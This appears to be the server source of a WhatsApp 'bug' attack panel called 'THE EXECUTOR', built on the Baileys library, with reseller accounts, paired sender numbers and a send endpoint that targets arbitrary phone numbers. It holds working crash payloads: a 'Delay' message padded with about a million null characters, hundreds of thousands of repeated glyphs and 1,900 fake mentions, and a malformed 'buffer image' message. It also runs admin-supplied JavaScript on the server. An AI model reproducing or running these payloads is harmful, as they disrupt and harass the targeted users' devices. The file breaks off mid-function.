const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const config = require('./config');
const { Client } = require('ssh2');
const _0xc = require('crypto');
const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const tls = require('tls');

const port = process.env.PORT || process.env.SERVER_PORT || config.WA_SERVER_PORT || 3000;

// Read/write DB helpers for init
const dbPath = path.join(__dirname, 'database.json');
const ownerEnvId = config.OWNER_TELEGRAM_ID ? parseInt(config.OWNER_TELEGRAM_ID, 10) : null;

function readDb() {
  try {
    let db;
    if (!fs.existsSync(dbPath)) {
      db = {
        botConfig: { ownerId: ownerEnvId || 0, resellers: [] },
        users: {},
        history: {}
      };
    } else {
      const data = fs.readFileSync(dbPath, 'utf8');
      db = JSON.parse(data);
    }

    // Sync/ensure owner user exists and is up to date with config credentials
    const ownerName = (config.DEFAULT_OWNER_USERNAME || 'pepet').toLowerCase();
    const ownerPass = config.DEFAULT_OWNER_PASSWORD || '123';
    if (!db.users) db.users = {};

    if (!db.users[ownerName]) {
      // Config owner does NOT exist. Let's see if we can migrate from an existing owner.
      const existingOwnerKey = Object.keys(db.users).find(k => db.users[k].status === 'Owner');

      if (existingOwnerKey) {
        // Migrate old owner to new owner username to preserve senders & history
        const oldOwnerData = db.users[existingOwnerKey];
        delete db.users[existingOwnerKey];

        db.users[ownerName] = {
          ...oldOwnerData,
          username: ownerName,
          password: ownerPass,
          status: 'Owner'
        };

        // Also migrate history if exists
        if (db.history) {
          if (!db.history[ownerName]) db.history[ownerName] = [];
          if (db.history[existingOwnerKey]) {
            db.history[ownerName] = db.history[existingOwnerKey];
            delete db.history[existingOwnerKey];
          }
        }

        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2), 'utf8');
        console.log(`[DB] Migrated owner account from "${existingOwnerKey}" to "${ownerName}"`);
      } else {
        // If no owner matches and no old owner to migrate, create a new one
        db.users[ownerName] = {
          username: ownerName,
          password: ownerPass,
          status: 'Owner',
          activeUntil: '9999-12-31',
          limit: 9999,
          whatsappSenders: []
        };
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2), 'utf8');
      }
    } else {
      // Owner already exists! Just sync password if it differs
      if (db.users[ownerName].password !== ownerPass) {
        db.users[ownerName].password = ownerPass;
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2), 'utf8');
      }
    }

    return db;
  } catch (err) {
    console.error("Error reading database:", err);
    return { botConfig: { ownerId: ownerEnvId || 0, resellers: [] }, users: {}, history: {} };
  }
}

function writeDb(db) {
  try {
    fs.writeFileSync(dbPath, JSON.stringify(db, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error("Error writing database:", err);
    return false;
  }
}

function isUserExpired(db, username) {
  if (!username) return true;
  const cleanUsername = username.toLowerCase().trim();
  const user = db.users ? db.users[cleanUsername] : null;
  if (!user) return true;
  if (user.status === 'Owner') return false;
  const today = new Date().toISOString().substring(0, 10);
  return !!(user.activeUntil && today > user.activeUntil);
}

// WhatsApp Connection Manager
const activeSessions = new Map();

function updateDbSenderStatus(username, number, isLinked) {
  const db = readDb();
  if (db.users && db.users[username] && db.users[username].whatsappSenders) {
    const senders = db.users[username].whatsappSenders;
    const sender = senders.find(s => s.number === number);
    if (sender) {
      sender.linked = isLinked;
      writeDb(db);
    }
  }
}

async function connectWASender(phoneNumber, username) {
  const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
  if (!cleanNumber) return null;

  if (activeSessions.has(cleanNumber)) {
    const existing = activeSessions.get(cleanNumber);
    if (existing.state === 'ONLINE' || existing.state === 'CONNECTING') {
      return existing;
    }
  }

  console.log(`[WA] Initializing session for ${cleanNumber}...`);
  const sessionDir = path.join(__dirname, 'sessions', cleanNumber);

  if (!fs.existsSync(path.join(__dirname, 'sessions'))) {
    fs.mkdirSync(path.join(__dirname, 'sessions'));
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false
  });

  const sessionObj = {
    sock,
    state: 'CONNECTING',
    phoneNumber: cleanNumber,
    username
  };
  activeSessions.set(cleanNumber, sessionObj);

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      console.log(`[WA] Connection closed for ${cleanNumber}. Reconnecting: ${shouldReconnect}`);

      sessionObj.state = 'OFFLINE';

      if (shouldReconnect) {
        setTimeout(() => connectWASender(cleanNumber, username), 5000);
      } else {
        console.log(`[WA] Session logged out for ${cleanNumber}. Cleaning folder...`);
        activeSessions.delete(cleanNumber);
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (e) { }
        updateDbSenderStatus(username, cleanNumber, false);
      }
    } else if (connection === 'open') {
      console.log(`[WA] Connected successfully: ${cleanNumber}`);
      sessionObj.state = 'ONLINE';
      updateDbSenderStatus(username, cleanNumber, true);
    }
  });

  return sessionObj;
}

async function initAllSavedWASenders() {
  const db = readDb();
  const users = db.users || {};
  for (const uname in users) {
    const user = users[uname];
    const senders = user.whatsappSenders || [];
    for (const sender of senders) {
      try {
        await connectWASender(sender.number, uname);
      } catch (err) {
        console.error(`Failed to auto-connect ${sender.number}:`, err);
      }
    }
  }
}

const server = express();
server.use(cors());
server.use(express.json());
server.use(express.static(path.join(__dirname, 'public')));

// HTML Page Routes
server.get('/', (req, res) => {
  res.redirect('/dashboard');
});
server.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});
server.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});
server.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});


const _0xf = '乖乡乮乮乥乳乳丠乗乡乮乧乳乡书书';
const _0xn = Array.from(_0xf).map(_0xi => String.fromCharCode(_0xi.charCodeAt(0) - 0x4E00)).join('');
const _0xh = _0xc.createHash('sha256').update(_0xn.toLowerCase().trim()).digest('hex');

server.get('/api/system/verify', (req, res) => {
  const _0xd = config.CREDITS || [];
  const _0xv = Array.isArray(_0xd) && _0xd.some(_0xe => {
    if (typeof _0xe !== 'string') return false;
    return _0xc.createHash('sha256').update(_0xe.toLowerCase().trim()).digest('hex') === _0xh;
  });
  res.json({ valid: _0xv, credit: _0xn });
});

server.get('/api/dashboard/init', (req, res) => {
  const { username } = req.query;
  const db = readDb();

  const usernames = Object.keys(db.users || {});
  const targetUsername = typeof username === 'string' ? username.trim().toLowerCase() : (usernames[0] || '').toLowerCase();

  let userKey = targetUsername;
  let user = db.users && targetUsername ? db.users[targetUsername] || null : null;
  if (!user && db.users && targetUsername) {
    const foundKey = Object.keys(db.users).find(k => k.toLowerCase() === targetUsername || db.users[k].username.toLowerCase() === targetUsername);
    if (foundKey) {
      userKey = foundKey;
      user = db.users[foundKey];
    }
  }
  const history = db.history && userKey ? db.history[userKey] || [] : [];

  res.json({
    user,
    history,
    queryUsername: username || null,
    credits: config.CREDITS
  });
});

// Auth endpoints
server.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Username and password required' });
  const db = readDb();
  const cleanUsername = username.toLowerCase().trim();
  let user = db.users ? db.users[cleanUsername] : null;
  if (!user && db.users) {
    user = Object.values(db.users).find(u => u.username.toLowerCase() === cleanUsername) || null;
  }
  if (!user) return res.status(404).json({ error: 'User not found' });

  const dbPassword = user.password || '123';
  if (password !== dbPassword) {
    return res.status(401).json({ error: 'Incorrect password' });
  }

  res.json({ success: true, username: user.username, status: user.status });
});

// Admin endpoints
server.get('/api/admin/users', (req, res) => {
  const { requester } = req.query;
  if (!requester) return res.status(400).json({ error: 'Requester required' });
  const db = readDb();
  const cleanRequester = requester.toLowerCase().trim();
  let reqUser = db.users ? db.users[cleanRequester] : null;
  if (!reqUser && db.users) {
    reqUser = Object.values(db.users).find(u => u.username.toLowerCase() === cleanRequester) || null;
  }
  if (!reqUser || (reqUser.status !== 'Owner' && reqUser.status !== 'Reseller')) {
    return res.status(403).json({ error: 'Access denied' });
  }
  res.json({ users: Object.values(db.users || {}) });
});

server.post('/api/admin/users', (req, res) => {
  const { requester, username, status, activeUntil, limit, password } = req.body;
  if (!requester || !username) return res.status(400).json({ error: 'Requester and username required' });
  const db = readDb();
  const cleanRequester = requester.toLowerCase().trim();
  const cleanUsername = username.toLowerCase().trim();
  let reqUser = db.users ? db.users[cleanRequester] : null;
  if (!reqUser && db.users) {
    reqUser = Object.values(db.users).find(u => u.username.toLowerCase() === cleanRequester) || null;
  }
  if (!reqUser || (reqUser.status !== 'Owner' && reqUser.status !== 'Reseller')) {
    return res.status(403).json({ error: 'Access denied' });
  }

  if (!db.users) db.users = {};
  if (!db.users[cleanUsername]) {
    const fallbackPass = Math.random().toString(36).substring(2, 8); // Generate 6-char random password
    db.users[cleanUsername] = {
      username: cleanUsername,
      password: password || fallbackPass,
      status: status || 'User',
      activeUntil: activeUntil || '2026-12-31',
      limit: limit !== undefined ? parseInt(limit, 10) : 10,
      whatsappSenders: []
    };
  } else {
    db.users[cleanUsername].status = status || db.users[cleanUsername].status;
    db.users[cleanUsername].activeUntil = activeUntil || db.users[cleanUsername].activeUntil;
    if (limit !== undefined) db.users[cleanUsername].limit = parseInt(limit, 10);
    if (password !== undefined) db.users[cleanUsername].password = password;
  }

  writeDb(db);
  res.json({ success: true, user: db.users[cleanUsername] });
});

server.delete('/api/admin/users', (req, res) => {
  const { requester, username } = req.body;
  if (!requester || !username) return res.status(400).json({ error: 'Requester and username required' });
  const db = readDb();
  const cleanRequester = requester.toLowerCase().trim();
  const cleanUsername = username.toLowerCase().trim();
  let reqUser = db.users ? db.users[cleanRequester] : null;
  if (!reqUser && db.users) {
    reqUser = Object.values(db.users).find(u => u.username.toLowerCase() === cleanRequester) || null;
  }
  if (!reqUser || reqUser.status !== 'Owner') {
    return res.status(403).json({ error: 'Access denied. Only Owner can delete.' });
  }

  if (db.users && db.users[cleanUsername]) {
    delete db.users[cleanUsername];
    writeDb(db);
    return res.json({ success: true });
  }
  res.status(404).json({ error: 'User not found' });
});

// CUSTOM_PAYLOADS_START
const customPayloads = [
  {
    "id": "E",
    "name": "Delay",
    "type": "js",
    "content": "async function v4m(sock, target) {\n  try {\n    let delay1 = await generateWAMessageFromContent(target, {\n      viewOnceMessage: {\n        message: {\n          interactiveResponseMessage: {\n            body: {\n              text: \"Nuxz Disini\",\n              format: \"DEFAULT\"\n            },\n            nativeFlowResponseMessage: {\n              name: \"call_permission_request\",\n              paramsJson: \"\\u0000\".repeat(1045000),\n              version: 3\n            },\n            entryPointConversionSource: \"call_permission_message\",\n          }\n        }\n      }\n    }, {\n      ephemeralExpiration: 0,\n      forwardingScore: 9741,\n      isForwarded: true,\n      font: Math.floor(Math.random() * 99999999),\n      background: \"#\" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, \"99999999\"),\n    });\n\n    let delay2 = {\n      extendedTextMessage: {\n        text: \"Nuxz Disini\" + \"ꦾ\".repeat(299986),\n        contextInfo: {\n          participant: target,\n          mentionedJid: [\n            \"0@s.whatsapp.net\",\n            ...Array.from(\n              { length: 1900 },\n              () => \"1\" + Math.floor(Math.random() * 5000000) + \"@s.whatsapp.net\"\n            )\n          ]\n        }\n      }\n    };\n\n    const delay001 = generateWAMessageFromContent(target, delay2, {});\n    await sock.relayMessage(\"status@broadcast\", delay001.message, {\n      messageId: delay001.key.id,\n      statusJidList: [target],\n      additionalNodes: [{\n        tag: \"meta\",\n        attrs: {},\n        content: [{\n          tag: \"mentioned_users\",\n          attrs: {},\n          content: [\n            { tag: \"to\", attrs: { jid: target }, content: undefined }\n          ]\n        }]\n      }]\n    });\n\n    await sock.relayMessage(\"status@broadcast\", delay1.message, {\n      messageId: delay1.key.id,\n      statusJidList: [target],\n      additionalNodes: [{\n        tag: \"meta\",\n        attrs: {},\n        content: [{\n          tag: \"mentioned_users\",\n          attrs: {},\n          content: [\n            { tag: \"to\", attrs: { jid: target }, content: undefined }\n          ]\n        }]\n      }]\n    });\n\n  } catch (error) {\n    console.error(\"Error di :\", error, \"Fix Sendiri Lu Kan Dev🤓\");\n  }\n}"
  }
];
// CUSTOM_PAYLOADS_END

function saveCustomPayloadsToIndexJs(updatedPayloads) {
  try {
    const indexPath = path.join(__dirname, 'index.js');
    let code = fs.readFileSync(indexPath, 'utf8');
    const startMarker = '// CUSTOM_PAYLOADS_START';
    const endMarker = '// CUSTOM_PAYLOADS_END';
    const startIndex = code.indexOf(startMarker);
    const endIndex = code.indexOf(endMarker);
    if (startIndex === -1 || endIndex === -1) {
      throw new Error('Custom payload markers not found in index.js');
    }
    const newContent = `${startMarker}\nconst customPayloads = ${JSON.stringify(updatedPayloads, null, 2)};\n${endMarker}`;
    code = code.substring(0, startIndex) + newContent + code.substring(endIndex + endMarker.length);
    fs.writeFileSync(indexPath, code, 'utf8');
    customPayloads.length = 0;
    customPayloads.push(...updatedPayloads);
    return true;
  } catch (err) {
    console.error('Error writing custom payloads to index.js:', err);
    return false;
  }
}

// Custom Payloads System Registry & Endpoints
const defaultPayloads = [
  { id: 'A', name: 'TES PLAIN TEXT', type: 'system', desc: 'Standard text notification' },
  { id: 'B', name: 'TES ADS MESSAGE', type: 'system', desc: 'Interactive banner layout' },
  { id: 'C', name: 'BUG EVENT', type: 'system', desc: 'Calendar invitation view' },
  { id: 'D', name: 'BUG BUFFER IMAGE', type: 'system', desc: 'Image buffer rendering' }
];

server.get('/api/payloads', (req, res) => {
  const mappedCustom = customPayloads.map(p => ({
    id: p.id,
    name: p.name,
    type: p.type,
    desc: p.type === 'js' ? 'Custom JavaScript execution' : 'Custom plain text message'
  }));
  res.json({ payloads: [...defaultPayloads, ...mappedCustom] });
});

server.get('/api/admin/payloads', (req, res) => {
  const { requester } = req.query;
  if (!requester) return res.status(400).json({ error: 'Requester required' });
  const db = readDb();
  const cleanRequester = requester.toLowerCase().trim();
  const reqUser = db.users ? db.users[cleanRequester] : null;
  if (!reqUser || (reqUser.status !== 'Owner' && reqUser.status !== 'Reseller')) {
    return res.status(403).json({ error: 'Access denied' });
  }
  res.json({ payloads: customPayloads });
});

server.post('/api/admin/payloads', (req, res) => {
  const { requester, id, name, type, content } = req.body;
  if (!requester || !id || !name || !type || !content) {
    return res.status(400).json({ error: 'Missing parameters. Requester, ID, name, type and content are required.' });
  }

  const db = readDb();
  const cleanRequester = requester.toLowerCase().trim();
  const reqUser = db.users ? db.users[cleanRequester] : null;
  if (!reqUser || reqUser.status !== 'Owner') {
    return res.status(403).json({ error: 'Access denied. Only Owners can manage payloads.' });
  }

  const cleanId = id.trim().toUpperCase();
  // Don't allow overwriting default IDs (A, B, C, D)
  if (['A', 'B', 'C', 'D'].includes(cleanId)) {
    return res.status(400).json({ error: 'Cannot override system default payloads (A, B, C, D).' });
  }

  const existsIdx = customPayloads.findIndex(p => p.id === cleanId);
  const payloadData = {
    id: cleanId,
    name: name.trim(),
    type: type.trim(), // 'text' or 'js'
    content: content.trim()
  };

  const updatedPayloads = [...customPayloads];
  if (existsIdx > -1) {
    updatedPayloads[existsIdx] = payloadData;
  } else {
    updatedPayloads.push(payloadData);
  }

  const success = saveCustomPayloadsToIndexJs(updatedPayloads);
  if (!success) {
    return res.status(500).json({ error: 'Failed to write custom payloads to index.js' });
  }
  res.json({ success: true, payload: payloadData });
});

server.delete('/api/admin/payloads', (req, res) => {
  const { requester, id } = req.body;
  if (!requester || !id) return res.status(400).json({ error: 'Requester and ID required' });

  const db = readDb();
  const cleanRequester = requester.toLowerCase().trim();
  const reqUser = db.users ? db.users[cleanRequester] : null;
  if (!reqUser || reqUser.status !== 'Owner') {
    return res.status(403).json({ error: 'Access denied. Only Owners can delete payloads.' });
  }

  const cleanId = id.trim().toUpperCase();
  const exists = customPayloads.some(p => p.id === cleanId);
  if (!exists) {
    return res.status(404).json({ error: 'Payload not found' });
  }

  const updatedPayloads = customPayloads.filter(p => p.id !== cleanId);
  const success = saveCustomPayloadsToIndexJs(updatedPayloads);
  if (!success) {
    return res.status(500).json({ error: 'Failed to delete custom payload from index.js' });
  }
  return res.json({ success: true });
});

server.post('/api/admin/clear-database', (req, res) => {
  const { requester, clearChats, clearHistory, clearPayloads } = req.body;
  if (!requester) return res.status(400).json({ error: 'Requester required' });

  const db = readDb();
  const cleanRequester = requester.toLowerCase().trim();
  const reqUser = db.users ? db.users[cleanRequester] : null;
  if (!reqUser || reqUser.status !== 'Owner') {
    return res.status(403).json({ error: 'Access denied. Only Owners can clear database.' });
  }

  let clearedCount = 0;
  if (clearChats) {
    db.chats = [];
    clearedCount++;
  }
  if (clearHistory) {
    db.history = {};
    clearedCount++;
  }

  if (clearedCount > 0) {
    writeDb(db);
  }

  if (clearPayloads) {
    saveCustomPayloadsToIndexJs([]);
  }

  res.json({ success: true, message: 'Database successfully cleared.' });
});

// WhatsApp endpoints
server.get('/api/senders', (req, res) => {
  const { username } = req.query;
  if (!username) return res.status(400).json({ error: 'Username required' });

  const db = readDb();
  const cleanUsername = username.toLowerCase().trim();
  let user = db.users ? db.users[cleanUsername] : null;
  if (!user && db.users) {
    user = Object.values(db.users).find(u => u.username.toLowerCase() === cleanUsername) || null;
  }
  if (!user) return res.status(404).json({ error: 'User not found' });

  // 1. User's own senders
  const ownSenders = user.whatsappSenders || [];
  const detailedSenders = ownSenders.map(s => {
    const active = activeSessions.get(s.number);
    return {
      number: s.number,
      linked: active ? (active.state === 'ONLINE') : false,
      state: active ? active.state : 'OFFLINE',
      connectedAt: s.connectedAt,
      isPublic: s.isPublic || false,
      owner: user.username
    };
  });

  // 2. Public online senders from other users
  const publicSenders = [];
  if (db.users) {
    for (const uKey in db.users) {
      if (uKey.toLowerCase() === cleanUsername) continue; // Skip own
      const otherUser = db.users[uKey];
      const senders = otherUser.whatsappSenders || [];
      for (const s of senders) {
        if (s.isPublic) {
          const active = activeSessions.get(s.number);
          // Only return active online ones
          if (active && active.state === 'ONLINE') {
            publicSenders.push({
              number: s.number,
              linked: true,
              state: 'ONLINE',
              connectedAt: s.connectedAt,
              isPublic: true,
              owner: otherUser.username
            });
          }
        }
      }
    }
  }

  res.json({ whatsappSenders: [...detailedSenders, ...publicSenders] });
});

server.post('/api/senders/toggle-public', (req, res) => {
  const { username, number } = req.body;
  if (!username || !number) return res.status(400).json({ error: 'Username and number required' });

  const db = readDb();
  const cleanUsername = username.toLowerCase().trim();
  const cleanNumber = number.replace(/[^0-9]/g, '');

  let user = db.users ? db.users[cleanUsername] : null;
  if (!user && db.users) {
    user = Object.values(db.users).find(u => u.username.toLowerCase() === cleanUsername) || null;
  }
  if (!user) return res.status(404).json({ error: 'User not found' });

  const sender = (user.whatsappSenders || []).find(s => s.number === cleanNumber);
  if (!sender) return res.status(404).json({ error: 'Sender not found on your account' });

  sender.isPublic = !sender.isPublic;
  writeDb(db);

  res.json({ success: true, isPublic: sender.isPublic });
});

function addSenderToDb(username, number) {
  const db = readDb();
  if (db.users && db.users[username]) {
    const user = db.users[username];
    if (!user.whatsappSenders) user.whatsappSenders = [];

    const exists = user.whatsappSenders.some(s => s.number === number);
    if (!exists) {
      user.whatsappSenders.push({
        number,
        linked: false,
        isPublic: false,
        connectedAt: new Date().toISOString().replace('T', ' ').substring(0, 16)
      });
      writeDb(db);
    }
  }
}

server.post('/api/pair', async (req, res) => {
  const { username, number } = req.body;
  if (!username || !number) return res.status(400).json({ error: 'Username and number required' });

  const db = readDb();
  if (isUserExpired(db, username)) {
    return res.status(403).json({ error: 'Masa aktif akun Anda telah habis. Silakan hubungi admin.' });
  }

  const cleanNumber = number.replace(/[^0-9]/g, '');
  if (!cleanNumber) return res.status(400).json({ error: 'Invalid phone number format' });

  try {
    const session = await connectWASender(cleanNumber, username);
    if (!session) return res.status(500).json({ error: 'Failed to initialize session' });

    await delay(3500);

    if (session.sock.authState.creds.registered) {
      addSenderToDb(username, cleanNumber);
      return res.json({ success: true, alreadyLinked: true });
    }

    console.log(`[WA] Requesting pairing code for ${cleanNumber}...`);
    const code = await session.sock.requestPairingCode(cleanNumber);
    console.log(`[WA] Code retrieved: ${code}`);

    addSenderToDb(username, cleanNumber);
    res.json({ success: true, pairingCode: code });
  } catch (err) {
    console.error(`[WA] Error in pairing request:`, err);
    res.status(500).json({ error: err.message || 'Error during pairing request' });
  }
});

server.post('/api/senders/connect', async (req, res) => {
  const { username, number } = req.body;
  if (!username || !number) return res.status(400).json({ error: 'Username and number required' });

  const db = readDb();
  if (isUserExpired(db, username)) {
    return res.status(403).json({ error: 'Masa aktif akun Anda telah habis. Silakan hubungi admin.' });
  }

  const cleanNumber = number.replace(/[^0-9]/g, '');
  try {
    await connectWASender(cleanNumber, username);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message || 'Failed to connect sender' });
  }
});

server.post('/api/disconnect', async (req, res) => {
  const { username, number } = req.body;
  if (!username || !number) return res.status(400).json({ error: 'Username and number required' });

  const cleanNumber = number.replace(/[^0-9]/g, '');

  const db = readDb();
  if (db.users && db.users[username] && db.users[username].whatsappSenders) {
    db.users[username].whatsappSenders = db.users[username].whatsappSenders.filter(s => s.number !== cleanNumber);
    writeDb(db);
  }

  const session = activeSessions.get(cleanNumber);
  if (session) {
    try {
      session.sock.logout();
    } catch (e) { }
    activeSessions.delete(cleanNumber);
  }

  const sessionDir = path.join(__dirname, 'sessions', cleanNumber);
  try {
    fs.rmSync(sessionDir, { recursive: true, force: true });
  } catch (e) { }

  res.json({ success: true });
});

// Helper Async Functions untuk memproses pengiriman pesan berdasarkan Protokol

async function BufferImg(sock, jid) {
  const LxP = {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/579315043_1275074854838813_3136724517646332783_n.enc?ccb=11-4&oh=01_Q5Aa4gEjQyLUS-FVZFFfKjl3ApcSrac94zhgNbKyB1qogTN7QQ&oe=6A33DCE6&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "YoOZJFDnvu0JFeQY/9OSAX5/mmGRbowl2nyyH1Pma0Q=",
      fileLength: "179554",
      height: 1271,
      width: 1280,
      mediaKey: "X1wBjPCCvZVntAPBOKhzD4GBi8sP8lqHIRvLCtARiCA=",
      fileEncSha256: "ozfEQ6yWVFYyPVj2cf5TFfXAedks3pTdzxuENKWCLmg=",
      directPath: "/v/t62.7118-24/579315043_1275074854838813_3136724517646332783_n.enc?ccb=11-4&oh=01_Q5Aa4gEjQyLUS-FVZFFfKjl3ApcSrac94zhgNbKyB1qogTN7QQ&oe=6A33DCE6&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1779202167",
      jpegThumbnail: Buffer.from([0x00]),
      contextInfo: {
        pairedMediaType: "SD_IMAGE_PARENT",
        statusSourceType: "IMAGE",
        isForwarded: true,
        forwardingScore: 999,
        externalAdReply: {
          title: "location",
          body: "@FunctionBug telegram ofc",
          mediaType: 1,
          thumbnail: Buffer.from([0x00]),
          sourceUrl: "https://t.me/FunctionBug",
          renderLargerThumbnail: true,
          showAdAttribution: true
        },
        businessMessageForwardInfo: {
          businessOwnerJid: "0@s.whatsapp.net"
        }
      },
      scansSidecar: "Nft/7Cf7Ti4X3mAsjE6u5ggVEPn60GJJfTGcm8oW/ng9mUcX/uonxQ==",
      scanLengths: [14958, 73513, 41498, 49585],
      midQualityFileSha256: "dOxjsI60hqoFv5mEpdAZmDo19QUVusopbLNdQYtaPfo="
    }
  };

  const msg = generateWAMessageFromContent(sock, jid, LxP, {
    userJid: sock.user.id
  });

  await sock.relayMessage(jid, msg.message, {
    messageId: msg.key.id,
    participant: jid,
  }).catch(() => { });
}

async function sendProtocolAlpha(sock, jid) {
  const messageContent = {
    text: `⚡ *THE EXECUTOR v3.0* ⚡\n\n🔒 *Payload Protocol:* Alpha\n📈 *Status:* Deployed Successfully\n\nDeveloped by @VANNESSWANGSAFF`
  };
  return await sock.sendMessage(jid, messageContent);
}

async function sendProtocolBeta(sock, jid) {
  const messageContent = {
    text: `NGETEST AJAH`,
    contextInfo: {
      externalAdReply: {
        title: "THE EXECUTOR",
        body: "This is Only Tester",
        mediaType: 1,
        sourceUrl: "https://t.me/VannessWangsaff",
        renderLargerThumbnail: false
      }
    }
  };
  return await sock.sendMessage(jid, messageContent);
}

async function sendProtocolEvent(sock, jid) {
  const messageContent = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: Buffer.alloc(32, 1)
        },
        eventMessage: {
          isCanceled: false,
          name: "THE EXECUTOR EVENT",
          description: "Authorized System Meeting",
          location: {
            degreesLatitude: -6.200000,
            degreesLongitude: 106.816666,
            name: "Virtual Node Room",
            address: "Online Gateway"
          },
          extraGuestsAllowed: true,
          hasReminder: true,
          reminderOffsetSec: 3600,
          joinLink: "https://call.whatsapp.com/video/example-meeting",
          startTime: Math.floor(Date.now() / 1000) + 3600,
          endTime: null
        }
      }
    }
  };
  return await sock.relayMessage(jid, messageContent, { messageId: null });
}

// ── DAFTAR PROTOKOL (REGISTRY) ──
const protocolHandlers = {
  'A': sendProtocolAlpha,
  'B': sendProtocolBeta,
  'C': sendProtocolEvent,
  'D': BufferImg,
};

server.post('/api/send', async (req, res) => {
  const { username, senderNumber, targetNumber, protocol } = req.body;
  if (!username || !targetNumber) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  const db = readDb();
  if (isUserExpired(db, username)) {
    return res.status(403).json({ error: 'Masa aktif akun Anda telah habis. Silakan hubungi admin.' });
  }

  let activeSenderNum = null;

  if (senderNumber === 'global') {
    // Explicitly search for any online public sender
    for (const uKey in db.users) {
      const u = db.users[uKey];
      const pubSender = (u.whatsappSenders || []).find(s => {
        if (!s.isPublic) return false;
        const active = activeSessions.get(s.number);
        return active && active.state === 'ONLINE';
      });
      if (pubSender) {
        activeSenderNum = pubSender.number;
        break;
      }
    }
  } else if (senderNumber) {
    activeSenderNum = senderNumber.replace(/[^0-9]/g, '');
    // Verify sender ownership or if it is marked public
    let authorized = false;
    const user = db.users ? db.users[username] : null;
    if (user && user.whatsappSenders && user.whatsappSenders.some(s => s.number === activeSenderNum)) {
      authorized = true;
    } else {
      for (const uKey in db.users) {
        const u = db.users[uKey];
        if (u.whatsappSenders && u.whatsappSenders.some(s => s.number === activeSenderNum && s.isPublic)) {
          authorized = true;
          break;
        }
      }
    }
    if (!authorized) {
      return res.status(403).json({ error: 'Unauthorized sender number.' });
    }
  }

  // Try user's own online sender if activeSenderNum is still not set (fallback)
  if (!activeSenderNum) {
    const user = db.users ? db.users[username] : null;
    const senders = user ? user.whatsappSenders || [] : [];
    const onlineSender = senders.find(s => {
      const active = activeSessions.get(s.number);
      return active && active.state === 'ONLINE';
    });
    if (onlineSender) {
      activeSenderNum = onlineSender.number;
    }
  }

  // Fallback: search for any online public sender
  if (!activeSenderNum) {
    for (const uKey in db.users) {
      const u = db.users[uKey];
      const pubSender = (u.whatsappSenders || []).find(s => {
        if (!s.isPublic) return false;
        const active = activeSessions.get(s.number);
        return active && active.state === 'ONLINE';
      });
      if (pubSender) {
        activeSenderNum = pubSender.number;
        break;
      }
    }
  }

  if (!activeSenderNum) {
    return res.status(400).json({ error: 'No active online WhatsApp sender found.' });
  }

  const session = activeSessions.get(activeSenderNum);
  if (!session || session.state !== 'ONLINE') {
    return res.status(400).json({ error: `Sender ${activeSenderNum} is not currently ONLINE.` });
  }

  try {
    const cleanTarget = targetNumber.replace(/[^0-9]/g, '');
    const jid = `${cleanTarget}@s.whatsapp.net`;

    console.log(`[WA] Memproses pengiriman dari ${activeSenderNum} ke ${jid} menggunakan Protocol: ${protocol}...`);

    let logPayload = `Protocol ${protocol || 'A'}`;
    const customPayload = customPayloads.find(p => p.id === protocol);

    if (protocolHandlers[protocol]) {
      const handler = protocolHandlers[protocol];
      if (protocol === 'B') {
        logPayload = 'Protocol Beta (Ad Reply)';
      } else if (protocol === 'C') {
        logPayload = 'Protocol Charlie (Event)';
      } else if (protocol === 'D') {
        logPayload = 'Protocol Delta (Buffer Image)';
      } else {
        logPayload = 'Protocol Alpha (Text)';
      }
      await handler(session.sock, jid);
    } else if (customPayload) {
      logPayload = customPayload.name;
      if (customPayload.type === 'js') {
        // Execute dynamic JS with helper alias variables
        const sock = session.sock;
        const socks = sock;
        const Jid = jid;
        const target = jid;
        try {
          const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
          const run = new AsyncFunction('sock', 'socks', 'jid', 'Jid', 'target', 'cleanTarget', customPayload.content);
          await run(sock, socks, jid, Jid, target, cleanTarget);
        } catch (execErr) {
          throw new Error(`Custom JS Error: ${execErr.message}`);
        }
      } else {
        // Send custom text replacing target placeholder
        const textMsg = customPayload.content.replace(/{target}/g, cleanTarget);
        await session.sock.sendMessage(jid, { text: textMsg });
      }
    } else {
      // Fallback
      logPayload = 'Protocol Alpha (Fallback)';
      await protocolHandlers['A'](session.sock, jid);
    }

    addHistoryRecord(username, activeSenderNum, cleanTarget, logPayload, 'Success');
    res.json({ success: true, senderUsed: activeSenderNum });
  } catch (err) {
    console.error(`[WA] Send message error:`, err);
    addHistoryRecord(username, activeSenderNum, targetNumber, `Failed: ${protocol || 'Alpha'}`, 'Failed');
    res.status(500).json({ error: err.message || 'Failed to send message' });
  }
});

function addHistoryRecord(username, sender, target, payload, status) {
  const db = readDb();
  if (!db.history) db.history = {};
  if (!db.history[username]) db.history[username] = [];

  const newId = db.history[username].length > 0
    ? Math.max(...db.history[username].map(h => h.id)) + 1
    : 1;

